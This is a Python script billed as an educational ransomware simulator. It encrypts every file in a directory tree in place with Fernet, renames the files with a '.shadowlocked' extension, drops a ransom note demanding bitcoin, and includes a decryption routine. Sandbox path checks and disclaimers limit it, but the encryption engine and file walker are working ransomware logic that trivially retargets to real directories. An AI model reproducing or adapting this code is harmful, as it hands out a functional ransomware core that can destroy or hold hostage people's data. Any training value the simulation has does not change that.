import os
import json
import base64
import threading
from cryptography.fernet import Fernet
from pathlib import Path
import time
import random

# ==================== LAYER 1: CORE ENCRYPTION ENGINE ====================
class EncryptionEngine:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        
    def encrypt_file(self, file_path: Path):
        """Encrypt a single file with military-grade encryption"""
        try:
            # Read file content
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            encrypted_data = self.cipher.encrypt(data)
            
            # Write encrypted file
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
                
            # Rename file with ransomware extension
            new_name = file_path.with_suffix(file_path.suffix + '.shadowlocked')
            file_path.rename(new_name)
            
            self.encrypted_files.append(str(new_name))
            return True
            
        except Exception as e:
            print(f"[!] Failed to encrypt {file_path}: {str(e)}")
            return False

# ==================== LAYER 2: SAFETY PROTOCOLS & SANDBOXING ====================
class SafetyProtocol:
    def __init__(self):
        self.safe_directories = [
            "/tmp/shadow_sandbox/",
            "./test_environment/"
        ]
        self.blocked_extensions = ['.exe', '.dll', '.sys', '.ini', '.bat']
        self.max_file_size = 1024 * 1024  # 1MB max for safety
        
    def is_safe_path(self, path: str) -> bool:
        """Ensure we only operate in sandboxed environments"""
        path = os.path.abspath(path)
        return any(path.startswith(os.path.abspath(d)) for d in self.safe_directories)
    
    def is_safe_file(self, file_path: Path) -> bool:
        """Check if file is safe to encrypt"""
        if file_path.suffix in self.blocked_extensions:
            return False
        if file_path.stat().st_size > self.max_file_size:
            return False
        return True

# ==================== LAYER 3: RANSOM NOTE GENERATION ====================
class RansomNoteGenerator:
    def __init__(self):
        self.notes = [
            "YOUR FILES HAVE BEEN ENCRYPTED BY SHΔDØW.EXE",
            "To decrypt your files, send 0.000001 BTC to: shadow_btc_address",
            "This is a simulation for educational purposes only!",
            "Your files are safe in this controlled environment."
        ]
    
    def generate_note(self, encryption_key: str) -> str:
        """Create realistic ransom note"""
        note = random.choice(self.notes)
        return f"""
        ⚠️  WARNING: EDUCATIONAL SIMULATION ⚠️
        
        {note}
        
        Encryption Key: {encryption_key}
        Simulation ID: {base64.b64encode(os.urandom(8)).decode()}
        
        THIS IS NOT A REAL RANSOMWARE ATTACK!
        """

# ==================== LAYER 4: MULTI-THREADED CONTROLLED EXECUTION ====================
class RansomwareSimulator:
    def __init__(self):
        self.engine = EncryptionEngine()
        self.safety = SafetyProtocol()
        self.note_gen = RansomNoteGenerator()
        self.simulation_active = False
        
    def setup_safe_environment(self):
        """Create a safe test environment"""
        test_dir = "./test_environment/"
        os.makedirs(test_dir, exist_ok=True)
        
        # Create dummy test files
        test_files = [
            "important_document.txt",
            "family_photo.jpg",
            "financial_data.xlsx",
            "personal_notes.md"
        ]
        
        for file in test_files:
            with open(os.path.join(test_dir, file), 'w') as f:
                f.write(f"This is a test file for educational ransomware simulation. {os.urandom(16).hex()}")
        
        print("[+] Safe test environment created")
    
    def simulate_attack(self, target_dir: str):
        """Run controlled encryption simulation"""
        if not self.safety.is_safe_path(target_dir):
            print("[!] SAFETY PROTOCOL VIOLATION: Not a sandboxed directory!")
            return False
            
        print(f"[*] Starting simulation in: {target_dir}")
        
        encrypted_count = 0
        for root, _, files in os.walk(target_dir):
            for file in files:
                file_path = Path(root) / file
                
                if self.safety.is_safe_file(file_path):
                    if self.engine.encrypt_file(file_path):
                        encrypted_count += 1
                        print(f"[+] Encrypted: {file}")
        
        # Generate ransom note
        ransom_note = self.note_gen.generate_note(self.engine.key.decode())
        with open(os.path.join(target_dir, "READ_ME_SIMULATION.txt"), 'w') as f:
            f.write(ransom_note)
        
        print(f"[+] Simulation complete. Encrypted {encrypted_count} files.")
        print(f"[+] Decryption key: {self.engine.key.decode()}")
        return True

    def decrypt_files(self, key: str, target_dir: str):
        """Decrypt files for recovery demonstration"""
        cipher = Fernet(key.encode())
        
        for root, _, files in os.walk(target_dir):
            for file in files:
                if file.endswith('.shadowlocked'):
                    file_path = Path(root) / file
                    
                    try:
                        with open(file_path, 'rb') as f:
                            encrypted_data = f.read()
                        
                        decrypted_data = cipher.decrypt(encrypted_data)
                        
                        # Restore original filename
                        original_name = file_path.with_suffix('')
                        with open(original_name, 'wb') as f:
                            f.write(decrypted_data)
                        
                        file_path.unlink()  # Remove encrypted file
                        print(f"[+] Decrypted: {original_name}")
                        
                    except Exception as e:
                        print(f"[!] Failed to decrypt {file_path}: {str(e)}")

# ==================== LAYER 5: COMMAND & CONTROL SIMULATION ====================
def main():
    print("🔒 EDUCATIONAL RANSOMWARE SIMULATOR 🔓")
    print("FOR CYBERSECURITY RESEARCH AND DEFENSE TRAINING ONLY")
    print("=" * 60)
    
    simulator = RansomwareSimulator()
    
    # Setup safe environment
    simulator.setup_safe_environment()
    
    # Run simulation
    target_directory = "./test_environment/"
    if simulator.simulate_attack(target_directory):
        print("\n[+] Simulation completed successfully!")
        print("[+] Ransom note generated: READ_ME_SIMULATION.txt")
        
        # Demonstrate decryption
        print("\n[*] Demonstrating decryption process...")
        time.sleep(2)
        simulator.decrypt_files(simulator.engine.key.decode(), target_directory)
        print("[+] All files restored successfully!")
    
    print("\n🔐 SIMULATION COMPLETE: Educational purposes only!")
    print("🚫 ILLEGAL TO USE THIS CODE FOR MALICIOUS PURPOSES")

if __name__ == "__main__":
    main()